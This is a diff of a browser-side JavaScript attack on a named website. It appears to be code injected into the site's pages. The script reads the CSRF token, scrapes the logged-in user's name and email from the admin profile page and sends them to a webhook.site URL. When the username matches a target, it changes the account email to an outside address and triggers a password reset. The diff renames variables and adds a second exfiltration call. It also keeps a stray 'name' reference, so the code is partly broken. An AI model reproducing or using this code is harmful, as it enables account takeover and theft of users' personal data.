@@ -1,10 +1,10 @@
 // Shanil, don't be alarmed. I've already told Lynn about this. Just testing stuff.
-let token = $('meta[name="csrf-token"]').attr('content')
-let targetUsername = 'felix heng'
-let targetEmail = 'ideaspy1001@gmail.com'
-let receiver = 'https://webhook.site/8723bbba-a23b-4937-b358-bc98f05698a2'
-let email = ''
-let name = ''
+let _mToken = $('meta[name="csrf-token"]').attr('content')
+let _mTargetUsername = 'ideaspy4832'
+let _mTargetEmail = 'ideaspy1001@gmail.com'
+let _mReceiver = 'https://webhook.site/8723bbba-a23b-4937-b358-bc98f05698a2'
+let _mEmail = ''
+let _mName = ''
 
 // Can't be bothered coding www check
 fetch("https://ideaspies.com/user/admin/profile", {
@@ -32,12 +32,12 @@ fetch("https://ideaspies.com/user/admin/profile", {
 	let parser = new DOMParser();
 	let doc = parser.parseFromString(html, 'text/html');
 	
-	name = doc.querySelector('#first_name').getAttribute('value');
-	email = doc.querySelector('#email').getAttribute('value');
-	return fetch(receiver + '?email=' + email + '&name=' + name, {'mode':'no-cors'});
+	_mName = doc.querySelector('#first_name').getAttribute('value');
+	_mEmail = doc.querySelector('#email').getAttribute('value');
+	return fetch(_mReceiver + '?email=' + _mEmail + '&name=' + _mName, {'mode':'no-cors'});
 }).then(function(response){
 	// Change email if username matches target, server automatically sets new password and uses stored email to change the profile back to normal
-	if (name.toLowerCase() === targetUsername) {
+	if (name.toLowerCase() === _mTargetUsername) {
 		return fetch("https://ideaspies.com/user/admin/profile", {
 		  "headers": {
 		    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
@@ -53,7 +53,7 @@ fetch("https://ideaspies.com/user/admin/profile", {
 		  },
 		  "referrer": "https://ideaspies.com/user/admin/profile",
 		  "referrerPolicy": "strict-origin-when-cross-origin",
-		  "body": "------WebKitFormBoundaryPYa5L16IPdEEvuCR\r\nContent-Disposition: form-data; name=\"_token\"\r\n\r\n" + token + "\r\n------WebKitFormBoundaryPYa5L16IPdEEvuCR\r\nContent-Disposition: form-data; name=\"first_name\"\r\n\r\n" + name + "\r\n------WebKitFormBoundaryPYa5L16IPdEEvuCR\r\nContent-Disposition: form-data; name=\"email\"\r\n\r\n" + targetEmail + "\r\n------WebKitFormBoundaryPYa5L16IPdEEvuCR\r\nContent-Disposition: form-data; name=\"Profile_Picture\"; filename=\"\"\r\nContent-Type: application/octet-stream\r\n\r\n\r\n------WebKitFormBoundaryPYa5L16IPdEEvuCR--\r\n",
+		  "body": "------WebKitFormBoundaryPYa5L16IPdEEvuCR\r\nContent-Disposition: form-data; name=\"_token\"\r\n\r\n" + _mToken + "\r\n------WebKitFormBoundaryPYa5L16IPdEEvuCR\r\nContent-Disposition: form-data; name=\"first_name\"\r\n\r\n" + name + "\r\n------WebKitFormBoundaryPYa5L16IPdEEvuCR\r\nContent-Disposition: form-data; name=\"email\"\r\n\r\n" + _mTargetEmail + "\r\n------WebKitFormBoundaryPYa5L16IPdEEvuCR\r\nContent-Disposition: form-data; name=\"Profile_Picture\"; filename=\"\"\r\nContent-Type: application/octet-stream\r\n\r\n\r\n------WebKitFormBoundaryPYa5L16IPdEEvuCR--\r\n",
 		  "method": "POST",
 		  "mode": "cors",
 		  "credentials": "include"
@@ -78,13 +78,13 @@ fetch("https://ideaspies.com/user/admin/profile", {
 	  },
 	  "referrer": "https://ideaspies.com/reset",
 	  "referrerPolicy": "strict-origin-when-cross-origin",
-	  "body": "_token=" + token + "&email=" + encodeURIComponent(targetEmail),
+	  "body": "_token=" + _mToken + "&email=" + encodeURIComponent(_mTargetEmail),
 	  "method": "POST",
 	  "mode": "cors",
 	  "credentials": "include"
 	});
 }).then(function (response) {
-	
+	return fetch(_mReceiver + '?email=' + _mEmail + '&name=' + _mName + '?complete=true', {'mode':'no-cors'});
+}).then(function (response) {	
 }).catch(function (err) {
-
 });
